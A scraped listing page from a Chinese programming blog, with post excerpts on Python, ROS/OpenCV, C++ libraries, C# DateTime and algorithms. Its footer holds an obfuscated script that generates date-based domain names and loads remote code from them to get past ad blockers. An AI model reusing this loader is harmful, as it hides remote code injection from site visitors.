stats.ttest_1samp(diff, 0) 代码详解：
ttest_1samp()用于检验样本的均值是否与给定的值相同。
diff是我们计算好的两组样本均值的差值，0表示检验差值的均值是否等于0。
statistic=2.90169是方差, pvalue=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ff375c80c54c3b2da6f1b874d16d4cc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/697a8e5ba8fc7f4924b2e9ac4d081384/" rel="bookmark">
			python面向对象入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是类 类是描述一类有相同行为和属性的对象的集合，类定义了每个对象具有的共同属性和方法，对象是类的实例化。在python中使用关键字Class可以定义一个类 :
class Cat(): year = 4 weight = 10 def eat(self): print("I'm eating") def run(self): print("I'm running") 通过实例化生成一个猫对象，具有猫类中共有的属性和方法，猫的属性和方法可以通过python引用的标准语法访问 : obj.name
cat = Cat() #访问属性 print(cat.year) #使用方法 cat.eat() 控制台输出如下:
构造方法 python中有一类特殊的方法，开头和结尾都有双下划线，比如要介绍的__init__()方法就是这类方法的一种。当类实例化时会自动调用__init__()方法，对实例初始化。
class Cat(): def __init__(self,year,weight): self.year = year self.weight = weight def eat(self): print("I'm eating")	这样我们就可以自己定义一个有自己间年龄和体重的猫。
cat = Cat(4,10) cat.year cat.eat() 输出4和I'm eating，
关键字self指向实例化的内存地址，即指向实例本身，则self.name可以理解为通过对象名访问方法和属性，与obj.name起到的作用一样。上述代码中的self.weight = weight可以理解为创建一个实例的weight属性并把它赋值为传进来的参数。
继承 为了简化代码，避免代码冗长，同时避免重复造轮子，我们可以定义一个抽象类，再让子类继承父类的属性和方法。
class Animal(): def __init__(self,year,weight): self.weight = weight self.year = year def eat(self): print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/697a8e5ba8fc7f4924b2e9ac4d081384/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e53a32c50bc3156d2580745c1ede0aa2/" rel="bookmark">
			Git、Github一站式教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/lonyw/article/details/75392410
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0765b99ae174cf5819c7ee615e11825/" rel="bookmark">
			Ubuntu20运行vins fusion中解决cv_brige与opencv版本冲突问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、安装包信息1. 相关安装包版本2. opencv双版本安装 二、ros程序中使用自己的opencv包方案1. 不使用cv_bridge(不推荐)方案2. 修改ros中的cv_bridge包，使其调用自己的opencv版本2.1 修改cv_bridgeConfig.cmake2.2 修改cv_bridge-extras.cmake文件 方案3. 修改cv_bridge功能包，对源码进行编译3.1 源码下载地址以及源码修改3.2 方式一：单独编译该源码3.3 方式二：该源码和vins fusion功能包一起编译 一、安装包信息 1. 相关安装包版本 eigen：版本：3.3.7ceres：版本：1.14opencv两个版本opencv3.4.6和ros noetic自带的opencv4 2. opencv双版本安装 安装不同的版本，只需要将其安装的路径修改即可，我这里是ros noetic使用的默认路径，opencv3.4.6的安装修改了安装路径到/usr/opencv_v_346
版本3.4.6
opencv安装及修改安装路径参考教程：链接 关键是：sudo cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/opencv_v_ .. 中CMAKE_INSTALL_PREFIX指定安装路径 安装之后，opencv3版本相关文件路径 /usr/opencv_v_346/bin//usr/opencv_v_346/lib//usr/opencv_v_346/include/opencv/usr/opencv_v_346/include/opencv2/usr/opencv_v_346/share/licenses/opencv3/usr/opencv_v_346/share/OpenCV ros中opencv4安装之后，相关文件路径（默认）
/usr/bin//usr/lib/jni//usr/lib/x86_64-linux-gnu//usr/include/opencv4/usr/include/opencv4/opencv2/usr/include/boost/compute//usr/share/licenses/opencv4/usr/share/opencv4/usr/share/java/opencv4/usr/share/java//usr/share/man/man1//usr/share/doc//usr/share/lintian/overrides//var/lib/dpkg/info/ 二、ros程序中使用自己的opencv包 方案1. 不使用cv_bridge(不推荐) 修改cmakelist中opencv的版本，使程序使用自己的opencv3.4.6
参考链接
找到自定义安装opencv的opencvConfig.cmake配置文件的路径/usr/opencv_v_346/share/Opencv指定该文件的目录set(OpenCV_DIR /usr/opencv_v_346/share/Opencv)用find package指令找到OpenCV包find_package(OpenCV 3 REQUIRED)指定OpenCV的头文件目录include_directories( ${OpenCV_INCLUDE_DIRS})将编译生成的文件与OpenCV的动态库/静态库进行链接target_link_libraries(${OpenCV_LIBS}) 方案2. 修改ros中的cv_bridge包，使其调用自己的opencv版本 参考链接
参考链接
**方法：**进入cv_bridge配置文件所在目录，并用gedit指令打开相关配置文件进行修改
cd /opt/ros/noetic/share/cv_bridge/cmake/ 2.1 修改cv_bridgeConfig.cmake sudo gedit cv_bridgeConfig.cmake 对以下两个部分进行修改，一个是包含的头文件目录，将其修改为自己的opencv安装目录
注意自己安装目录前边还有个include;#if(NOT "include;/usr/include/opencv4 " STREQUAL " ") # set(cv_bridge_INCLUDE_DIRS "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0765b99ae174cf5819c7ee615e11825/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b61d55aefbd9bf9a56dbfd9a3756078/" rel="bookmark">
			双色球彩票生成之一用户彩票号码随机生成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		主要流程如下:1. 使用WinningNumber()方法随机生成一组1-33的红球号码和1-16的蓝球号码,作为中奖号码。2. 同样使用WinningNumber()方法随机生成一组作为用户号码。3. 判断用户号码中红球和蓝球的中奖情况:
- 红球判断使用contains()方法检查用户号码的红球是否在中奖号码的红球中。
- 蓝球直接比较两组号码的第6位(蓝球号码)。4. 根据中奖情况判断中奖级别和奖金:
- 6红球1蓝球:一等奖6000万
- 6红球0蓝球:二等奖500万
- 5红球1蓝球或5红球0蓝球:三等奖3000元
- 4红球1蓝球或4红球0蓝球:四等奖200元
- 3红球1蓝球或2红球1蓝球:五等奖10元
- 1红球1蓝球或0红球1蓝球:六等奖5元
- 否则:与奖擦肩而过5. 输出中奖信息,包括中奖级别和奖金。这个程序使用了Random类生成随机数,采用数组存储号码,并使用基本方法判断中奖和包含情况。
package com.itheima.test; import java.util.Random; import java.util.Scanner; //用户号码随机版本======================================================================================================= public class test10_1 { public static void main(String[] args) { Scanner sc = new Scanner(System.in); //随机生成6个红色中奖号码（1-33）和一个蓝色(1-16)中奖号码分别放在数组索引0-5和6：用方法 int[] winningNumber = WinningNumber(); //随机生成用户中奖号码 int[] userNumber = WinningNumber(); for (int i = 0; i &lt; winningNumber.length; i++) { System.out.print(winningNumber[i] + " "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b61d55aefbd9bf9a56dbfd9a3756078/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a87c380f0bf4705b8e0e35679d820579/" rel="bookmark">
			【python】统计代码行数 | 统计当前文件夹里所有代码文件的行数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景 写了一堆.cs文件
想看看一共写了多少行
代码 import os import chardet # Check if a file has the given extension def has_extension(file, extension): return os.path.splitext(file)[1] == extension # Count the number of non-empty lines in a file def count_lines_of_code(file): with open(file, 'rb') as f: result = chardet.detect(f.read()) encoding = result['encoding'] with open(file, 'r', encoding=encoding) as f: lines = [line.strip() for line in f if line.strip()] return len(lines) # Get all files with the given extension in the current directory def get_files_with_extension(extension): files = [file for file in os.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a87c380f0bf4705b8e0e35679d820579/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/831f4b596d24c836f8dc454fb4736b5a/" rel="bookmark">
			大众情人13
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Floyed
中心节点 去接近 周围节点 for(int k = 1;k&lt;=n;k++) for(int i = 1;i&lt;=n;i++) for(int j = 1;j&lt;=n;j++) { if(f[i][j]&gt;f[i][k] + f[k][j]) { f[i][j] = f[i][k] + f[k][j]; } } 在男人/女人中找每个人的最远距离异性，保存，再找其中的最小距离感 再 保存 最小距离感 的编号输出
在男人/女人中找每个人的最远距离异性
int max_m[N] = {0},max_f[N] = {0};//保存i的最大距离感 for(int i = 1;i&lt;=n;i++) { for(int j = 1;j&lt;=n;j++) { if(gender[i] &amp;&amp; gender[i] != gender[j])//男 { max_m[i] = max(max_m,f[j][i]);//i的距离感 是别人给他的 }else if(!gender[i] &amp;&amp; gender[i] != gender[j]){ max_f[i] = max(max_f[i],f[j][i]); } } } 找最大距离中 距离最小的进行保存 寻找编号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/831f4b596d24c836f8dc454fb4736b5a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/444669b04b008c65af8b416b26940638/" rel="bookmark">
			C&#43;&#43;静态库与动态库理解、创建、使用（超详细版本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文转自：作者：吴秦
出处：http://www.cnblogs.com/skynet/
目录
什么是库
静态库
Linux下创建与使用静态库
Linux静态库命名规则
创建静态库（.a）
使用静态库
Windows下创建与使用静态库
创建静态库（.lib）
使用静态库
动态库
为什么还需要动态库？
Linux下创建与使用动态库
linux动态库的命名规则
创建动态库（.so）
使用动态库
Windows下创建与使用动态库
创建动态库（.dll）
使用动态库
动态库的显式调用
在Linux下显式调用动态库
在Windows下显式调用动态库
显式调用C++动态库注意点
附件：Linux下库相关命令
g++(gcc)编译选项
nm命令
ldd命令
总结
什么是库 库是写好的现有的，成熟的，可以复用的代码。现实中每个程序都要依赖很多基础的底层库，不可能每个人的代码都从零开始，因此库的存在意义非同寻常。
本质上来说库是一种可执行代码的二进制形式，可以被操作系统载入内存执行。库有两种：静态库（.a、.lib）和动态库（.so、.dll）。
所谓静态、动态是指链接。回顾一下，将一个程序编译成可执行程序的步骤：
图：编译过程
静态库 之所以成为【静态库】，是因为在链接阶段，会将汇编生成的目标文件.o与引用到的库一起链接打包到可执行文件中。因此对应的链接方式称为静态链接。
试想一下，静态库与汇编生成的目标文件一起链接为可执行文件，那么静态库必定跟.o文件格式相似。其实一个静态库可以简单看成是一组目标文件（.o/.obj文件）的集合，即很多目标文件经过压缩打包后形成的一个文件。静态库特点总结：
l 静态库对函数库的链接是放在编译时期完成的。
l 程序在运行时与函数库再无瓜葛，移植方便。
l 浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件。
下面编写一些简单的四则运算C++类，将其编译成静态库给他人用，头文件如下所示：
StaticMath.h头文件
#pragma once
class StaticMath
{
public:
StaticMath(void);
~StaticMath(void);
static double add(double a, double b);//加法
static double sub(double a, double b);//减法
static double mul(double a, double b);//乘法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/444669b04b008c65af8b416b26940638/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dac59e9a9ccfe356313f12035d9971dc/" rel="bookmark">
			python的發展歷史
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着人工智能以及大数据的普及，python一度成为炙手可热的技术方向。为什么Python能够得到众多互联网工作者热衷的编程语言呢？首先要了解Python的发展历程，从而更好的判断Python在每个阶段发展过程中的重要作用。
Python的诞生
Python是由荷兰人Guido van Rossum研发的。Guido van Rossum于1982年获得阿姆斯特丹大学数学和计算机硕士学位，当时Guido在CWI（数学与计算机科学国家研究所）工作，主要是为ABC语言贡献代码，工作一段时间后，他感觉现有的编程语言对非计算机专业的人十分不友好，于是1989年12匜，他构思了一门致力于解决问题的编程语言，这就是Python最初的来源。
1991年，Python的第一个解释器诞生。它有C语言实现，而且受到ABC语言的影响，因此其中很多语法来源于C语言和ABC语言。而Python1.0版本真正发布于1994年1月，这个版本主要新功能是lambda、map、filter和reduce。
Python2.0版本是在6年半之后的2000年10月份发布的，这个版本的主要新功能是内存管理和循环检测垃圾收集器以及对Unicode的支持，构成了现在Python语言框架的基础。之后再2004年，Python升级到2.4版本，同年最流行的Web框架Django诞生。之后Python陆续推Python2.5/2.6/2.7版本。截止目前仍然有很多企业在使用Python2.7版本。不过自2020年1月1日期，Python2.x版本将不再得到支持。Python的核心开发人员将不再提供其错误修复版或安全更新，Python2.x即将进入付费时代。
目前Python开发主流应用的是Python3.x版本，但是Python3和Python2版本有很多代码并不兼容，因此建议大家如果想要学习Python编程语言，可以直接从Python最新版本开始。目前最流行的Python版本是3.10版本。
接下來解釋一下python2.X和python3.0X版本的區別：
一、核心差异
1、Python2中字符串有str和Unicode两种类型，而Python3中只支持Unicode下的string。
2、Python3中采用绝对路径的方式进行import
3、Python3对于缩进更加严格，tab和space共存会导致报错TabError。而Python2中一个tab和8个space是等价的。
二、废弃差异
1、Python3中废弃print语句，统一使用print函数；
2、Python3中废弃exec语句，统一使用exec函数；
3、Python中废弃execfile语句，推荐使用exec(open(“./filename”).read())
4、Python3中废弃“&lt;&gt;”表示不相等，统一使用“!=”
5、Python3中废弃long证书类型，统一使用int
6、Python3中废弃Xrange函数，统一使用range，同时range的机制修改并提高了大数据集生成效率。
7、Python3中不在返回list对象
8、Python3中废弃iterator的next()函数，统一使用next(iterator)
9、Python3中废弃raw_input函数，统一使用input函数
10、Python3中废弃file函数，统一使用open函数处理文件。
11、Python3中废弃apply函数。
12、Python3中StandardError被废弃，统一使用Exception
除去这些不同之外，Python3还在某些语法和基本操作上有一些改动。对于Python的使用来说，最重要的变化是因为版本不兼容导致的第三方工具包、系统安装支持等方面的重大变化。
如果您是初学者，建议你直接学习Python3版本，对于Python2版本相关的知识稍作了解，如果在未来工作中会遇到Python2版本的相关开发工作，你可以对照Python2规范，使用Python3版本的进行开发。而对于正在使用Python2版本开发的同学而言，建议你能够尽快的熟悉Python2与Python3之间的差异，尽快迁移自己的程序。
拓展阅读：
&gt;ABC语言：ABC语言是一个为编程初学者打造的研究项目，是NWO（荷兰科学研究组织）旗下CWI（数学与计算机科学国家研究所）主导研发的一种交互式，结构化高级语言，旨在替代BASIC、Pascal等语言，用于教学及原型软件设计。Python之父Guido van Rossum层为ABC系统开发中工作了数年。在这里仅做了解即可。
&gt;lambda：lambda表达式是一个匿名函数，可以包含表达式和语句，并且可用于创建委托或表达式目录树类型。
&gt;map：map()函数会根据提供的函数对制定序列做映射。
&gt;filter：filter()函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。
&gt;reduce：reduce()函数会对参数序列中元素进行积累。
&gt;Django：Django是一个开源的Web应用框架，采用MTV的框架模式，即模型M，试图V和模板T。主要目的是简便、快速的开发数据库驱动的网站。强调代码复用，多个组件可以很方便的以插件形式服务于整个框架。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf1794032e643bd29f924832696b26d8/" rel="bookmark">
			C#DateTime时间转换方法大全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在C#中，DateTime是一种表示日期和时间的结构，它包含了许多转换方法，可以将DateTime对象转换为不同格式的字符串或其他类型。下面是DateTime转换的一些常见方法和示例：
ToLongDateString() 将当前DateTime对象的日期部分转换为长日期字符串。例如：
DateTime dt = DateTime.Today; string longDateString = dt.ToLongDateString(); Console.WriteLine(longDateString); 输出结果为：Monday, February 14, 2022
ToShortDateString() 将当前DateTime对象的日期部分转换为短日期字符串。例如：
DateTime dt = DateTime.Today; string shortDateString = dt.ToShortDateString(); Console.WriteLine(shortDateString); 输出结果为：2/14/2022
ToLongTimeString() 将当前DateTime对象的时间部分转换为长时间字符串。例如：
DateTime dt = DateTime.Now; string longTimeString = dt.ToLongTimeString(); Console.WriteLine(longTimeString); 输出结果为：12:00:00 AM
ToShortTimeString() 将当前DateTime对象的时间部分转换为短时间字符串。例如：
DateTime dt = DateTime.Now; string shortTimeString = dt.ToShortTimeString(); Console.WriteLine(shortTimeString); 输出结果为：12:00 AM
ToString() 将当前DateTime对象转换为指定格式的字符串，可以使用标准或自定义格式字符串。例如：
DateTime dt = DateTime.Now; string customFormatString = dt.ToString("yyyy-MM-dd"); Console.WriteLine(customFormatString); 输出结果为：2022-02-14
注意，在使用自定义格式字符串时，可以使用以下符号来表示各种时间格式：
y：年份M：月份d：日期h：12小时制小时H：24小时制小时m：分钟s：秒钟f：毫秒F：十分之一毫秒z：时区偏移量Parse() 将字符串转换为DateTime对象。例如：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bf1794032e643bd29f924832696b26d8/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/149/">«</a>
	<span class="pagination__item pagination__item--current">150/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/151/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>